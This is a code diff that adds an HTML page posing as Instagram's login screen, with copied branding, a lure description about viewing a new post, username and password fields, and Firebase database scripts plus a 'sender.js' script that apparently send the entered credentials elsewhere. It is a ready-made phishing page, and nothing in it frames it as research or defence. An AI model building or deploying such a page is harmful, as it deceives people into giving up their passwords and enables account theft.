@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en" data-textdirection="ltr">
+  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui"
+    />
+    <title>New post review</title>
+    <meta
+      name="description"
+      content="View my latest Instagram post, please like and share..."
+    />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="images/favi-icon/favicon.ico/36b3ee2d91ed.ico"
+    />
+    <!--Google Fonts-->
+    <link
+      href="https://fonts.googleapis.com/css?family=Comfortaa:300,400,500,700"
+      rel="stylesheet"
+    />
+
+    <!-- BEGIN Page Level CSS-->
+    <link rel="stylesheet" type="text/css" href="css/animation.css" />
+    <!-- END Page Level CSS-->
+    <!-- BEGIN Custom CSS-->
+    <link rel="stylesheet" type="text/css" href="css/css/style.css" />
+    <!-- END Custom CSS-->
+    <script src="https://www.gstatic.com/firebasejs/7.14.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.14.0/firebase-database.js"></script>
+    <!-- <script src="https://www.gstatic.com/firebasejs/7.14.0/firebase-firestore.js"></script> -->
+  </head>
+  <body
+    class="1-column undefined page-animated"
+    data-menu-open="hover"
+    data-menu=""
+  >
+    <!-- Preloader | Comment below code if you don't want preloader-->
+    <div id="loader-wrapper">
+      <svg
+        width="50"
+        height="50"
+        viewBox="0 0 50 50"
+        id="loader"
+        style="fill: #c7c7c7"
+      >
+        <path
+          d="M25 1c-6.52 0-7.34.03-9.9.14-2.55.12-4.3.53-5.82 1.12a11.76 11.76 0 0 0-4.25 2.77 11.76 11.76 0 0 0-2.77 4.25c-.6 1.52-1 3.27-1.12 5.82C1.03 17.66 1 18.48 1 25c0 6.5.03 7.33.14 9.88.12 2.56.53 4.3 1.12 5.83a11.76 11.76 0 0 0 2.77 4.25 11.76 11.76 0 0 0 4.25 2.77c1.52.59 3.27 1 5.82 1.11 2.56.12 3.38.14 9.9.14 6.5 0 7.33-.02 9.88-.14 2.56-.12 4.3-.52 5.83-1.11a11.76 11.76 0 0 0 4.25-2.77 11.76 11.76 0 0 0 2.77-4.25c.59-1.53 1-3.27 1.11-5.83.12-2.55.14-3.37.14-9.89 0-6.51-.02-7.33-.14-9.89-.12-2.55-.52-4.3-1.11-5.82a11.76 11.76 0 0 0-2.77-4.25 11.76 11.76 0 0 0-4.25-2.77c-1.53-.6-3.27-1-5.83-1.12A170.2 170.2 0 0 0 25 1zm0 4.32c6.4 0 7.16.03 9.69.14 2.34.11 3.6.5 4.45.83 1.12.43 1.92.95 2.76 1.8a7.43 7.43 0 0 1 1.8 2.75c.32.85.72 2.12.82 4.46.12 2.53.14 3.29.14 9.7 0 6.4-.02 7.16-.14 9.69-.1 2.34-.5 3.6-.82 4.45a7.43 7.43 0 0 1-1.8 2.76 7.43 7.43 0 0 1-2.76 1.8c-.84.32-2.11.72-4.45.82-2.53.12-3.3.14-9.7.14-6.4 0-7.16-.02-9.7-.14-2.33-.1-3.6-.5-4.45-.82a7.43 7.43 0 0 1-2.76-1.8 7.43 7.43 0 0 1-1.8-2.76c-.32-.84-.71-2.11-.82-4.45a166.5 166.5 0 0 1-.14-9.7c0-6.4.03-7.16.14-9.7.11-2.33.5-3.6.83-4.45a7.43 7.43 0 0 1 1.8-2.76 7.43 7.43 0 0 1 2.75-1.8c.85-.32 2.12-.71 4.46-.82 2.53-.11 3.29-.14 9.7-.14zm0 7.35a12.32 12.32 0 1 0 0 24.64 12.32 12.32 0 0 0 0-24.64zM25 33a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm15.68-20.8a2.88 2.88 0 1 0-5.76 0 2.88 2.88 0 0 0 5.76 0z"
+        />
+      </svg>
+
+      <div class="loader-section section-left"></div>
+      <div class="loader-section section-right"></div>
+    </div>
+    <!--/ Preloader -->
+    <!-- /////////////////////////////////// HEADER /////////////////////////////////////-->
+
+    <main>
+      <div>
+        <div id="forma">
+          <svg
+            xmlns="../external.html?link=http://www.w3.org/2000/svg"
+            xmlns:xlink="../external.html?link=http://www.w3.org/1999/xlink"
+            width="200"
+            height="60"
+            viewBox="0 -1.5 200 60"
+          >
+            <defs>
+              <clipPath id="clip-path">
+                <rect width="250" height="57" />
+              </clipPath>
+            </defs>
+            <g clip-path="url(#clip-path)">
+              <image
+                x="13"
+                y="3"
+                width="175"
+                height="51"
+                xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAzCAYAAADhNlhNAAANxUlEQVR4nO1dC7Be0xVeV9wrufL2up6JEAmCSFvqkSmtSaRKPRLV6EtNi1SiHq2OarTUoEJLp2hJE4/SalB0iFBlQrziESXqUZVBQiJpRCJP9+8c8x2zfL61/3NvbnL/xPlmztxz9ln7dfbaa6+19tr/7WDV0cPMdjezXnheVCBPLWFjMxtoZpuZ2XIzW1YDbSqxhtHRzMZhwCvummZmO9RA+4ribGr/VDPbqQbaVWINocnMZtCg++sPNdDGorhStP+sGmhXidXEBiItY9x/QlXI8ISg2XgNt6st0UWkLWmHdpRoYzDzZoz7gJn1x/N1ZjZc5CuiK9cKOom0knnXAzDzjjezfrj/l5mdYGYfFMhXy1DM+347tKNEG8Mz4Ugz+7J7Ph2WeV2VfLWOjURaybzrATbE303N7DKX/qiZ3Yt7xbwqrRYwxsy2BHMuwd9tBd2WcP29a2aLzWxVO7S1RBvhUrLGD3Hveglr/dZ2bGuEXRLekWpXtsLMNrM7aqAfJVqAzma20A3kIieRM/QWg31bO7Y3wqjVYN78WlAD/ShREJnuOsTMurm0qbSM1qqKwFjcBmXU4qQsESCTsAdT2v30rIyz9mTozP/caGbPkuGVufX+hJ3BzEhrMLOuZvaiKON4M3sZk7QZHpXlAW0H7ChmE/wl6Mmri8xPvjP08lfMbGUL8mb9+4GZHWRmS83sHHiGVgcN8DJtiG+wzhi0D9PSeSC937GA2lAP//A9ZvZL5FHIGOEUM3vQzKab2Zkt2PD4ipk959owJ1FPjsZAPdi+QH3ZpD3RzN52+TJGvx7+8GygvweaAwp6YDY3s6sxabyqcioEQhMY85jA0DTU7/syo0C9ETI34lisWnl5y2EDdcbkPwX93CtRztFm9jiExwm0kmdjfoWZPY22fyEo40gzewS8NaKoR+s/9DF2ofd9CzBvkzCANiWaRkh1LmuWme1WpY3DIZ0474+q5Ns4YN7NC3wXta2cXzPN7BuU9jwNGmNzSO6ozMvA2Jzm0Ufke0/UtVmBPmYCZ3KiPf/A9/Vp9wdM9WeiG+/enSjKPp3yN9EEyq4XsDol8QZl4qCVfgWYdytB05tobkt8qLmJmdYV0knl+26VvnUJ8nWuku/MAsbdIpG2d1BeB0imlpb5XyrnOyLPW/DRn29md+Fb5u8mkfHtkZqcfmJwWk9R1i1Ecx/S66AWcRmLabzPCOpXoQkfw32UYU96318Uyq6yrQVNL/f+uAIfao+gfacE9NnytkWVvnUL8qa2t3fCysF5boQfeQLUh5b0QXlCsvZfDskUTewXqJyvFfiOfH1dtKcfqS7ZtcLMrjKzk+EyjMprFOXdTjT5HsEXE+V4/oiCwN6pMr72c8owgt7vLAq9hWi2FTS5ztZIemO2vJ4m6D8XtI91vPy6olrHzKy7yLeiSp6JIs8York8aFM/UV4m+d4kulUiZuSvorxniCZbhea1kHm/L9p0o2jPMKK5JyhPrZB/D5j3j4l25fEzeyRoXk+M04doIklzJb3ftQDzqo2MbfDO602LYLmfJOh3DdqnPsA8oVMr9BR5lY6YozuY29M/Lui6wevAZbOqlOEoQXe1oBsk6FTdB7j32QpwCYzks4QErAhv0s7wrniaa0U9atMn8orcTXRToFP/D88fiNVsAPJe6NJYhf13UN/HcAINrmeMAaITkyi/2sjYCsuzlzongV7pOJEHQA3+sUU6hX5w3tRSpJblYwJaVrfyPjNYylWCYPg6odtPE3SHufcP0bsLKH8zTsJ4/FS0Z2DQR14xomi8KYJ5h7nni4VxOAh5cw/SStG2p4L6PkS+BPzezH6CznamYO0iPl21lOSzPh/QGajHAr0p8i3eInzP2Wzdt0C7VNuXJ+jZTViB1a0wXaTxEaM6+GM9ZsLrwKjA9+yhIvqGuvsb6N1n6fkVSD8Pbs+ChLuN+xgdoeLxr8D1lef5lcjbCKGXr7h3mtl8okmqeL7Si8xsPyw9PQIa3zgPxSTN5A34GdIs8O22xDG+DfzKp1ahaynzDqDnl6CiKMwqUPZ2cFt5PJCon7enOWCog9OV34Nf1WN3elbWOrslnxDjmeM1eo6+HRvA2fPhuL8Z35DHtzPp2ROFZyS5ecOM+SgqPc6lKQbgzioG746NBcNu2J3unWLeaFYfCKvVEDyTox7O9L+08GRHKoKMfdyvJGiVVGRJoQy45xJlLqXnZnoe4vy3E0h/7yp8u8/S8ya4POYm2sPfKpKEPP57O9Uzn2C8fZ+5MQfjfiHUCi6nRcyrUIR5Fc2R2HY0WOcerDY0Jxp6Af5OxRLDeuDR2LFT/kelgyqmM2wps374ZkAblcODzVLXhDTzYMnDzDvK1fNretfLPgne7lZGLqsVHtyfaOIzH+V+9AVO7VpIND2d6jfZGcoe0YogK1VoreQdib/ZjLuJ3jHzRjN6OGZxM9xVCyF97iO6z+DcHZ+aONw+iYh51e5YyjOhfMX8XdSKwIPooSZ1jh3dYYHMfciTQG288OTrKGhSzMtjz5MpossxxX1vrqe/m3CT8ZfVkiR/tpZ5mQEUTa4/ThL6Dg+SYqgGJ3WvcT7PJbC4HyP6TN87l9KOtE+iJcyb0sO3o2clJVqq27PHxZd5NsZrBVxjDHXciXVoRZOaTEX6aAnm9cYuqydD3P1U/GXVYo0wL8/AVDk3i7Roy9JjNKTNQrhQPJaCgdk6HeMY5ktBzETUVrWPrrwiOZjR6kTZqi51LMmgw6ulP2/bN3Gfbc68KmgUY/I4FRFEHn3oORq3iHkfdffMvLl9scD1h5lX9ekjtJZ5WfeJylks3FwmPgLn3wLeCUPUk/LNznWSOUcDnPgbQs+eJyRLFDwzVKSpY/M51A+vNNCzMoa6BuX1SWxbX4pvlPXnvIBGMRZLfqXDs57vwX2sD+jUd1pFLsHZgibDk+6ef41JrVw75Ctsaw9SsnGV0nlSrqkcHamMcWCy58SOn4c6jtQFy+ouYGD2YXYP6j9CpPcN6t0EejaDy54jaFia5dgvSD/C7ZKNTpz2eFuk8eDPFpJ266C8gcIIVkzaM9gdfZ1sGeVaNIQL+PZ5KIN7dL4St1bysoEVlXNvkM7LQ537UMMQbmgIykm5thRzjEBUWGYg/E64prq4rescJ+JQJtfFQUo5hgeSromelaQaJNIsMC57uhiOv8EtGEF5MVgVWiVUrag9I0VaN7G6HBrwCPvH3wkC+b07chaNQXfh2hsG4VnoQMQ+YjvxQqIZKGgqgZ/TguCXoaDPt0ivd/THB9FRuwf1VrDlbUE8qd/y7YMPm02EXwjafajOOhiLqk5u4xWC5lXx4XcQUV7+mo/JVQ0cfniNqIfLXikmXSexNZxf/Yk2+hZ3i/Y9JOgOIRqOMPOTOo+hebrAt/gQg0WFZxCNin+IdqYsYJJ58CRUsHzkPskxjuY2N4j12PhQH26KWw16ixDG6ci/DcIOK1iKthRB73dS20917zgQ5jpHtxU8C9WYvAFuvohxPxDBNRHGCab3vt3fBHVcQuX8FukrIPE97ShHd0yi3Ry8ZRSEk198QoPjM+4Q79jHHWKoqJDD+dSMvitR5tGJTi+H0WWQAPPp/TIcXZoT5H9RGCEc9VRBEPdS3L/s9MNbBe11kABXuYlwowgFXQlJvz8MkQpCTpcSXWaY/BAqzjSkNQdMPLboQGGHjQPI78HqcQak+wwhoZsRf3A4VJM8/Rzo9p72dUymw6CaLQuk7/WifTuKExO8Jd9XCJDLoArmGxm8GoYYLhrGVmgnUeFFiTJ7iNDDCj7uUY5OTYrUNT04/jJAMFB+Ze34vKPdjk4jqOth58ZRUWP59ThWgCLB+GcKFef5Vhx2Tf0EwEoYhnsFAff+usnVnTouNA7qCaersE/DVv/TEEpTAnfYxYn6eIMqCY69jfb7OSBZBUF78BI3L7D4j01I2fx6F641NiY8viqk0kL4gxmDII3V5LqSdqo6iZDACiScn0ijA4Z5x+ngfDTnkSrfMMJJYrIuoRXz4GCSvg8VyhvhXQJ9dQr81urY1PmtbLvBGB4vynzKe0eKzOpMgv7YPZ+L5YSxGU5IbI9ZNVZYth4b4CPvBQkzMREk0oAZuy9iYbuDEWbBEX57wai0rOPfhtExGyGafE4sRyN26AaDWWfitIPaIDAYHkOgS0/DoUT2XvSGvtsX6tFj2MRZCrfeyUT/pAhzLIomnHnbCW2eIPy8PRHDPAjj8QzareyVOqgVB4FhH4R0XgX/9Aioez3gtru4yEmIKtgTmzPdsKpOFMFLSXipMr+KU7tEy9Eh8L5UxDGgEi3ARs4DUHFblCXaBvV0do2PFqXCJ0tUwUFO1zutBtqzPqEj2Qlv0BGfStEzXCU0DoDrpLBrokQh1JP7bi52w3Yj5p1ZA20tUeIj1JF7bZn7sZI9iXnVObkSJdoN7CL8lnu3P72bmiinRIm1isG0VX0VvT+YmFfFQpcosdaxEf3Q3lsihHJkGzr613usS/8YZV3HURQfPFYEyvNPtqrfCy5RYq1jAhlp6kQF/y5bdCzoU48Saxc+uGVyQPOaoymlbhWUasPagz+fpWI4BpKkHS9oSpRoF4wiqcqniG9w79+ucvjzU48Saxf19Ovok7BzuRvFwy5PHMYsUaLdsD39Uxi+5ohfqiwRYF35H2vrEzogOu9Qtx08G+fzrq0SA10ih5n9HwAtRPW3jK1ZAAAAAElFTkSuQmCC"
+              />
+            </g>
+          </svg>
+          <form action="#" id="form">
+            <div class="form-group">
+              <div>
+                <input
+                  type="text"
+                  name="text"
+                  placeholder="Phone number, username, or email"
+                  id="email"
+                />
+              </div>
+            </div>
+            <div class="form-group">
+              <div>
+                <input
+                  id="password"
+                  type="password"
+                  name="password"
+                  placeholder="password"
+                />
+                <span
+                  id="tchange"
+                  toggle="#password"
+                  class="insta field-icon toggle-password"
+                  >show</span
+                >
+              </div>
+            </div>
+            <button type="submit">Log In</button>
+
+            <div class="orr">
+              <p>OR</p>
+            </div>
+            <p id="alert-message"></p>
+            <a href="#">Forget password?</a>
+          </form>
+        </div>
+
+        <div class="sign-up">
+          <p>Don't have an account? <a href="#"> Sign Up </a></p>
+        </div>
+        <p class="get">Get the app.</p>
+        <div class="links">
+          <a href="#">
+            <img src="images/demo/app.png" alt="" />
+          </a>
+          <a href="#">
+            <img src="images/demo/google%20play.png" alt="" />
+          </a>
+        </div>
+        <div class="nd-links">
+          <a href="#">Meta</a>
+          <a href="#">About</a>
+          <a href="#">Blog</a>
+          <a href="#">Jobs</a>
+          <a href="#">Help</a>
+          <a href="#">API</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+          <a href="#">Top Account</a>
+          <a href="#">Hashtags</a>
+          <a href="#">Locations</a>
+          <a href="#">Instagram Lite</a>
+        </div>
+        <footer>
+          <p>English © 2022 Instagram from Meta</p>
+        </footer>
+      </div>
+    </main>
+
+    <script src="js/vendors.min.js"></script>
+    <script src="js/theme.min.js"></script>
+    <script src="js/password.js"></script>
+    <script src="js/sender.js">
+
+     
+     
+    </script>
+  </body>
+</html>
